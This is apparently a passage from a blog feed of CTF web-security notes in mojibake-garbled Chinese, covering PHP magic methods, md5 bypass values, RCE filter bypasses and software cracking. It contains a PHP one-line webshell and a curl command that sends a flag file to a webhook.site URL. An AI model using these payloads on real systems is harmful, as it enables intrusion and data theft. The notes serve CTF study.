class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$test</span> -&gt;var2;         <span class="hljs-comment">//è°ƒç”¨çš„æˆå‘˜å±æ€§var2ä¸å­˜åœ¨ï¼Œè§¦å‘__get(),æŠŠä¸å­˜åœ¨çš„å±æ€§çš„åç§°var2èµ‹å€¼ç»™$arg1ï¼Œè¾“å‡ºï¼švar2</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>11.__isset()<br>å½“å¯¹ä¸€ä¸ªå¯¹è±¡çš„ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§ä½¿ç”¨ isset() æˆ– empty() å‡½æ•°æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œä¼ é€’å±æ€§åä½œä¸ºå‚æ•°ã€‚__isset()æ–¹æ³•æœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºè¦è°ƒç”¨çš„å˜é‡å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$test</span>-&gt;<span class="hljs-keyword">var</span>);       <span class="hljs-comment">// è°ƒç”¨çš„æˆå‘˜å±æ€§varä¸å¯è®¿é—®ï¼Œå¹¶å¯¹å…¶ä½¿ç”¨isset()å‡½æ•°æˆ–empty()å‡½æ•°ï¼Œè§¦å‘__isset()ï¼Œè¾“å‡ºï¼švar</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>12.__unset()<br>å½“å¯¹ä¸€ä¸ªå¯¹è±¡çš„ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§ä½¿ç”¨ unset() å‡½æ•°æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œä¼ é€’å±æ€§åä½œä¸ºå‚æ•°ã€‚__unset()æ–¹æ³•æœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºè¦è°ƒç”¨çš„å˜é‡å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span> </span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span>  <span class="hljs-variable">$arg1</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$test</span>-&gt;<span class="hljs-keyword">var</span>);        <span class="hljs-comment">// è°ƒç”¨çš„æˆå‘˜å±æ€§varä¸å¯è®¿é—®ï¼Œå¹¶å¯¹å…¶ä½¿ç”¨unset()å‡½æ•°ï¼Œè§¦å‘__unset()ï¼Œè¾“å‡ºï¼švar</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>.13 __clone()<br>å½“å¯¹è±¡è¢«å¤åˆ¶æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"> </span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span>  <span class="hljs-string">&quot;__clone test&quot;</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>() ;<br><span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">clone</span>(<span class="hljs-variable">$test</span>)        <span class="hljs-comment">// __clone test</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>webå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unserialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web2</title>
    <link href="/2024/09/24/web2/"/>
    <url>/2024/09/24/web2/</url>
    
    <content type="html"><![CDATA[<h3 id="æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ"><a href="#æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ"></a>æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ</h3><h4 id="é‡å®šå‘åˆ°æ–‡ä»¶"><a href="#é‡å®šå‘åˆ°æ–‡ä»¶" class="headerlink" title="é‡å®šå‘åˆ°æ–‡ä»¶"></a>é‡å®šå‘åˆ°æ–‡ä»¶</h4><blockquote><p>cmd_here &gt; 1.txt<br>ç„¶ååˆ©ç”¨wegtå‘½ä»¤è¿›è¡Œæ–‡ä»¶ä¸‹è½½</p></blockquote><h4 id="curlå¤–å¸¦"><a href="#curlå¤–å¸¦" class="headerlink" title="curlå¤–å¸¦"></a>curlå¤–å¸¦</h4><p>å¯ä»¥åˆ©ç”¨webhook.siteå»ºç«‹ç½‘ç»œç«¯å£ç›‘å¬ï¼Œ<br>ç„¶åæ‰§è¡Œ<br>cmd&#x3D;curl <a href="https://webhook.site/2c5bcc35-bc12-4910-bae5-e51fbadac519/%60cat">https://webhook.site/2c5bcc35-bc12-4910-bae5-e51fbadac519/`cat</a> &#x2F;flag | base64&#96;<br>æ¥å®ç°base64ç¼–ç è·å–</p><h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h4>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>odå‘½ä»¤</title>
    <link href="/2024/09/20/od%E5%91%BD%E4%BB%A4/"/>
    <url>/2024/09/20/od%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>é’ˆå¯¹Fiddler4.6.2çš„åç¼–è¯‘ä»¥åŠæœ€æ–°ç‰ˆæœ¬çš„ç ´è§£</title>
    <link href="/2024/09/18/%E9%92%88%E5%AF%B9Fiddler4-6-2%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E7%A0%B4%E8%A7%A3/"/>
    <url>/2024/09/18/%E9%92%88%E5%AF%B9Fiddler4-6-2%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1837902&highlight=fiddler+4.6.2">å‚è€ƒæ–‡çŒ®å¾çˆ±ç ´è§£</a></p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æˆ‘ä»¬æ ¹æ®ä½œè€…çš„äº†è§£å‘ç°fiddlerå¯¹è½¯ä»¶æœ‰ç¯¡æ”¹æ£€éªŒï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰ä»¥ä¸‹çš„å‡ ä¸ªæ€è·¯</p><blockquote><ol><li>ä¿®æ”¹æœ¬åœ°æ–‡ä»¶ä½¿ç¯¡æ”¹æ£€æµ‹å¤±æ•ˆ</li><li>æœ¬åœ°å»ºè®®æœåŠ¡å™¨ä¼ªé€ å“åº”</li></ol></blockquote><h3 id="å¸¸ç”¨ILå¯¹åº”åå…­è¿›åˆ¶"><a href="#å¸¸ç”¨ILå¯¹åº”åå…­è¿›åˆ¶" class="headerlink" title="å¸¸ç”¨ILå¯¹åº”åå…­è¿›åˆ¶"></a>å¸¸ç”¨ILå¯¹åº”åå…­è¿›åˆ¶</h3>]]></content>
    
    
    <categories>
      
      <category>é€†å‘å®æˆ˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>revser</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webç®€å•åˆ©ç”¨</title>
    <link href="/2024/09/18/web%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/"/>
    <url>/2024/09/18/web%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å†™ä¸€äº›åƒåœ¾webç”¨åˆ°äº†ä¸çŸ¥é“çš„çŸ¥è¯†ï¼Œåœ¨æ­¤è®°å½•ï¼Œé¦–å…ˆæ˜¯å¤´æ–‡ä»¶ç»•è¿‡</p><blockquote><p>X-Forwarded-For : ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„ è¯·æ±‚ç«¯çœŸå®çš„IP ï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹</p></blockquote><p>å¯ä»¥å®ç°å¯¹webå¯¹æœ¬åœ°çš„è®¿é—®è¾¾åˆ°ç½‘å€ç»•è¿‡çš„æ•ˆæœ</p><h4 id="md5ç»•è¿‡"><a href="#md5ç»•è¿‡" class="headerlink" title="md5ç»•è¿‡"></a>md5ç»•è¿‡</h4><h5 id="ç›¸åŒçš„md5å­—ç¬¦ä¸²"><a href="#ç›¸åŒçš„md5å­—ç¬¦ä¸²" class="headerlink" title="ç›¸åŒçš„md5å­—ç¬¦ä¸²"></a>ç›¸åŒçš„md5å­—ç¬¦ä¸²</h5><p>a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><p>Param1&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</p><p>Param2&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</p><p>$data1&#x3D;â€\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70â€;<br>$data2&#x3D;â€\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70â€;</p><h5 id="phpå¼±ç±»å‹ç»•è¿‡"><a href="#phpå¼±ç±»å‹ç»•è¿‡" class="headerlink" title="phpå¼±ç±»å‹ç»•è¿‡"></a>phpå¼±ç±»å‹ç»•è¿‡</h5><blockquote><p>MMHUWUV 0e701732711630150438129209816536<br>MAUXXQC 0e478478466848439040434801845361<br>IHKFRNS 0e256160682445802696926137988570<br>GZECLQZ 0e537612333747236407713628225676<br>GGHMVOE 0e362766013028313274586933780773<br>GEGHBXL 0e248776895502908863709684713578<br>EEIZDOI 0e782601363539291779881938479162<br>DYAXWCA 0e424759758842488633464374063001</p></blockquote><h5 id="phpå¼ºç±»å‹æ¯”è¾ƒ"><a href="#phpå¼ºç±»å‹æ¯”è¾ƒ" class="headerlink" title="phpå¼ºç±»å‹æ¯”è¾ƒ"></a>phpå¼ºç±»å‹æ¯”è¾ƒ</h5><blockquote><p>&#x3D;&#x3D;&#x3D;ä¼šè¿åŒæ•°æ®ç±»å‹ä¸€èµ·æ¯”è¾ƒï¼ŒåŒæ—¶ä¸€äº›è§£æä¹Ÿè¢«é™åˆ¶äº†ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡ã€‚æ•°ç»„ç»•è¿‡æ˜¯æŒ‡æˆ‘ä»¬ä¼ å€¼çš„æ—¶å€™ä¼ ä¸€ä¸ªæ•°ç»„ä¸Šå»ï¼Œæ¯”å¦‚?id[]&#x3D;1,è¿™ä¸ªå°±æ˜¯ä½¿ç”¨GETæ–¹æ³•ä¼ å€¼æ—¶å€™çš„æ“ä½œã€‚å½“md5å‡½æ•°é‡åˆ°æ•°ç»„ä¹‹åä¼šè¿”å›ç©ºå€¼ï¼Œå› ä¸ºå®ƒæ— æ³•åŠ å¯†æ•°ç»„ï¼Œäºæ˜¯å¯ä»¥ç»•è¿‡phpå¼ºç±»å‹æ¯”è¾ƒã€‚</p></blockquote><h4 id="phpæ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#phpæ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="phpæ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>phpæ–‡ä»¶ä¸Šä¼ æ¼æ´</h4><p>ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæœ¨é©¬æ¥å— POST å‚æ•°ä¸­0çš„å€¼ä½œä¸ºå€¼, æˆ‘ä»¬å¯ä»¥ä½¿ç”¨èšå‰‘è¿æ¥è¿™ä¸ªæœ¨é©¬(å¯†ç ä¸º 0)<br>ä¸Šä¼ æˆåŠŸåä¼šè¿”å›åç«¯çš„åˆ¤æ–­ä»£ç , æ­¤æ—¶å¯ä»¥çŸ¥é“æˆ‘ä»¬ä¸Šä¼ çš„è·¯å¾„ä¸º uploadsä¸”æ–‡ä»¶åä¸å˜</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡èšå‰‘è¿›è¡Œè¿æ¥</p><h4 id="phpä»£ç æ‰§è¡Œ"><a href="#phpä»£ç æ‰§è¡Œ" class="headerlink" title="phpä»£ç æ‰§è¡Œ"></a>phpä»£ç æ‰§è¡Œ</h4><p><a href="https://www.php.net/manual/zh/function.eval.php">ç›¸å…³æ–‡æ¡£</a><br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ system å‡½æ•°æ‰§è¡Œ Shell å‘½ä»¤,<br>ä¹Ÿå¯ç”¨ä½¿ç”¨ echo file_get_contents(â€˜&#x2F;flagâ€™); æ¥è¾“å‡ºflagå†…å®¹  </p><p>ä¸‹é¢ç»™å‡º system çš„ç¤ºä¾‹</p><blockquote><p>DT&#x3D;system(â€˜cat &#x2F;flagâ€™);<br>æ³¨æ„ç”¨;æ¥åˆ†éš”ï¼Œå› ä¸ºæ­¤æ—¶å·²ç»æ˜¯ä¸€ä¸ªphpè¯­å¥äº†</p></blockquote><p>è§£é‡Š:<br>system(â€˜cat &#x2F;flagâ€™)ï¼šsystem() å‡½æ•°ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œsystem() å‡½æ•°æ‰§è¡Œçš„æ˜¯ cat &#x2F;flagï¼Œå®ƒä¼šå°è¯•è¯»å–ç³»ç»Ÿä¸­è·¯å¾„ä¸º &#x2F;flag çš„æ–‡ä»¶å†…å®¹å¹¶è¾“å‡ºåˆ°ç»ˆç«¯</p><blockquote><p>DT&#x3D;phpinfo();æ£€æŸ¥ç‰ˆæœ¬ä¿¡æ¯æŸ¥æ¼æ´</p></blockquote><h4 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h4><p>åœ¨çœ‹äº†åŠä¸ªå°æ—¶åç»ˆäºæ‡‚äº†ä¸€ç‚¹ï¼Œååºåˆ—åŒ–å°±æ˜¯åˆ©ç”¨å·²ç»å­˜åœ¨çš„å‡½æ•°ä¹‹é—´çš„è°ƒç”¨ï¼Œä»¥åŠç‰¹æ®Šæ–¹æ³•ç»•è¿‡å¯¹åº”çš„æ£€æŸ¥ååˆ©ç”¨åºåˆ—åŒ–å‡½æ•°ç”Ÿæˆä¸€ä¸ªå¯ä»¥åœ¨åé¢æ‰§è¡Œå¹¶è·å–ä»£ç çš„æ¼æ´</p><p>POP chain<br>é­”æœ¯æ–¹æ³•ï¼š</p><blockquote><p>__construct()   &#x2F;&#x2F;å¯¹è±¡åˆ›å»º(new)æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚<br>__wakeup()        &#x2F;&#x2F;ä½¿ç”¨unserializeæ—¶è§¦å‘<br>__sleep()        &#x2F;&#x2F;ä½¿ç”¨serializeæ—¶è§¦å‘<br>__destruct()        &#x2F;&#x2F;å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘<br>__call()        &#x2F;&#x2F;åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘<br>__callStatic()        &#x2F;&#x2F;åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘<br>__get()        &#x2F;&#x2F;ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® åŒ…æ‹¬privateæˆ–è€…æ˜¯ä¸å­˜åœ¨çš„<br>__set()        &#x2F;&#x2F;ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§<br>__isset()        &#x2F;&#x2F;åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘<br>__unset()         &#x2F;&#x2F;åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘<br>__toString()    &#x2F;&#x2F;æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘<br>__invoke()             &#x2F;&#x2F;å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘  å°±æ˜¯åŠ äº†æ‹¬å·<br>__autoload()           &#x2F;&#x2F;åœ¨ä»£ç ä¸­å½“è°ƒç”¨ä¸å­˜åœ¨çš„ç±»æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•ã€‚<br>çš„åºåˆ—åŒ–å­—ç¬¦ä¸²åœ¨ååºåˆ—åŒ–å¯¹è±¡æ—¶ä¸çœŸå®å­˜åœ¨çš„å‚æ•°ä¸ªæ•°ä¸åŒæ—¶ä¼šè·³è¿‡æ‰§è¡Œï¼Œå³å½“å‰å‡½æ•°ä¸­åªæœ‰ä¸€ä¸ªå‚æ•°$flagï¼Œè‹¥ä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„å‚æ•°ä¸ªæ•°ä¸º2å³å¯ç»•è¿‡</p></blockquote><h4 id="RCEè¿‡æ»¤"><a href="#RCEè¿‡æ»¤" class="headerlink" title="RCEè¿‡æ»¤"></a>RCEè¿‡æ»¤</h4><h5 id="Windowsç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š"><a href="#Windowsç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š" class="headerlink" title="Windowsç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š"></a>Windowsç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š</h5><ol><li>â€œ|â€ï¼šç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ||â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥æ‰§è¡Œå¤±è´¥ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºå‡æ‰è¡Œã€‚</li><li>â€œ&amp;â€ï¼šä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚</li><li>â€œ&amp;&amp;â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</li></ol><h5 id="Linuxç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š"><a href="#Linuxç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š" class="headerlink" title="Linuxç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š"></a>Linuxç³»ç»Ÿæ”¯æŒçš„ç®¡é“ç¬¦å¦‚ä¸‹ï¼š</h5><ol><li>â€œ;â€ï¼šæ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ|â€ï¼šæ˜¾ç¤ºåé¢è¯­å¥çš„æ‰§è¡Œç»“æœã€‚</li><li>â€œ||â€ï¼šå½“å‰é¢çš„è¯­å¥æ‰§è¡Œå‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚</li><li>â€œ&amp;â€ï¼šä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™æ‰§è¡Œæ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚</li><li>â€œ&amp;&amp;â€ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚</li></ol><h5 id="è¾“å‡ºé‡å®šå‘"><a href="#è¾“å‡ºé‡å®šå‘" class="headerlink" title="è¾“å‡ºé‡å®šå‘"></a>è¾“å‡ºé‡å®šå‘</h5><p><img src="https://gitee.com/fogpost/photo/raw/master/202409231119238.png" srcset="/img/loading.gif" lazyload></p><h5 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤"></a>è¿‡æ»¤</h5><p><a href="https://blog.csdn.net/Manuffer/article/details/120672448">å‚è€ƒ</a></p><ul><li>cat <blockquote><p>cat\tac\more\less\head\tail\nl\tailf<br>å•å¼•å· câ€™â€™at<br>åŒå¼•å· câ€â€at<br>shellç‰¹æ®Šå˜é‡ ca$@t</p></blockquote></li><li>ç©ºæ ¼<blockquote><p>&lt; ã€&lt;&gt;ã€%20(space)ã€%09(tab)ã€$IFS$9ã€ ${IFS}ã€$IFSç­‰ %0a(urlç¼–ç )<br>$IFSåœ¨linuxä¸‹è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œä½†æ˜¯å¦‚æœå•çº¯çš„cat$IFS2ï¼Œbashè§£é‡Šå™¨ä¼šæŠŠæ•´ä¸ªIFS2å½“åšå˜é‡åï¼Œæ‰€ä»¥å¯¼è‡´è¾“ä¸å‡ºæ¥ç»“æœï¼Œå› æ­¤è¿™é‡ŒåŠ ä¸€ä¸ª{}å°±å›ºå®šäº†å˜é‡åã€‚<br>åŒç†ï¼Œåœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­çš„ä½œç”¨ï¼Œä½¿ç”¨$9æ˜¯å› ä¸ºå®ƒæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²</p></blockquote></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
